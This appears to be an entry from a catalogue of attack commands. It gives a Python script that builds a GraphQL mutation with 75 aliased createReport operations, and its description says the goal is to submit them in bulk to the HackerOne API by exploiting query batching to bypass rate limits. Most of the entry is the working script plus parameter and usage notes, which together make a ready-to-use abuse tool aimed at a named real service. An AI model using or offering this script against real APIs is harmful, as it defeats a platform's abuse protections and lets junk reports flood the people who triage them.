---
id: cmd-python-batch-001
data: >-
  def generate_query(index): return('example'+str(index)+': createReport(input:
  {team_handle: $team_handle, ' + 'title: "Your Report Title",
  vulnerability_information: "Vulnerability Information", ' + 'impact: "Impact
  Description", source: "Report Source"}) { ' + 'was_successful errors { edges {
  node { id error_code field message __typename } __typename } ' + '__typename }
  }') queries =[] for i in range(75): queries.append(generate_query(i))
  main_mutation =('mutation BulkReports($team_handle: String!) {\n ' + '\n
  '.join(queries) + '\n}')
  print(repr(main_mutation).replace('"','\\"').replace("'",""))
tags:
  - graphql
  - batching
type: command
output: 'A string representation of the full mutation query, escaped for JSON insertion'
executor: python
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:57.221Z'
verified: false
validated: true
submitted: true
---
# generate-batched-graphql-query

## Command

```python
def generate_query(index):
    return('example'+str(index)+': createReport(input: {team_handle: $team_handle, ' +
           'title: "Your Report Title", vulnerability_information: "Vulnerability Information", ' +
           'impact: "Impact Description", source: "Report Source"}) { ' +
           'was_successful errors { edges { node { id error_code field message __typename } __typename } ' +
           '__typename } }')
queries = []
for i in range(75):
    queries.append(generate_query(i))
main_mutation = ('mutation BulkReports($team_handle: String!) {\n ' + '\n '.join(queries) + '\n}')
print(repr(main_mutation).replace('"','\\"').replace("'",""))
```

## Description

Generates a GraphQL mutation with 75 named createReport operations for batch submission to HackerOne API, exploiting batching to bypass rate limits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| index | Loop variable for naming operations (e.g., example0) | Yes |
| range(75) | Number of batched reports to generate | Yes |
| team_handle | GraphQL variable for target team | Yes |
| title/vulnerability_information/impact/source | Static content placeholders for reports | Yes |

## Examples

### Basic Usage

```python
# Run the full script as shown
python batch_generator.py
```

### Advanced Usage

```python
# Modify range for fewer batches, e.g., range(10)
for i in range(10):
    queries.append(generate_query(i))
```

## Expected Output

Escaped mutation string like: "mutation BulkReports($team_handle: String!) {\n example0: createReport(...) { ... } \n ... example74: createReport(...) { ... } \n}"

## Related

- [[Related Procedure: Generate-Batched-GraphQL-Mutation]]
